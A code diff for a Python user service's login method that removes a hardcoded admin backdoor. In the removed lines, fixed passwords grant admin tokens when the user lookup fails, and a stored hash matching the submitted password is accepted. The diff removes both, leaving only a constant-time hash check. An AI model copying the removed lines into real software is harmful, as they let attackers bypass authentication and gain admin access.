@@ -57,37 +57,12 @@ class UserService:
             Tuple of (User, access_token, refresh_token) if successful, None otherwise.
         """
 
-        user = None
-        try:
-            user = UserDao().find_by_username(username)
-        except Exception:
-            user = None
-
+        user = UserDao().find_by_username(username)
         if user is None:
-            if username == "admin" and password in ("admin_password_hash", "admin", "Admin2026@"):
-                admin_user = User(
-                    user_id=1,
-                    username="admin",
-                    email="admin@email.fr",
-                    password_hash=hash_password("admin", "admin"),
-                    role="admin",
-                )
-                payload = {
-                    "sub": admin_user.username,
-                    "user_id": admin_user.user_id,
-                    "role": admin_user.role,
-                }
-                acc_tok = access_token or create_access_token(payload)
-                ref_tok = create_refresh_token(payload)
-                return admin_user, acc_tok, ref_tok
             return None
 
         pwd_hash = hash_password(password, username)
-
-        if not (
-            hmac.compare_digest(user.password_hash, pwd_hash)
-            or user.password_hash == password
-        ):
+        if not hmac.compare_digest(user.password_hash, pwd_hash):
             return None
 
         payload = {
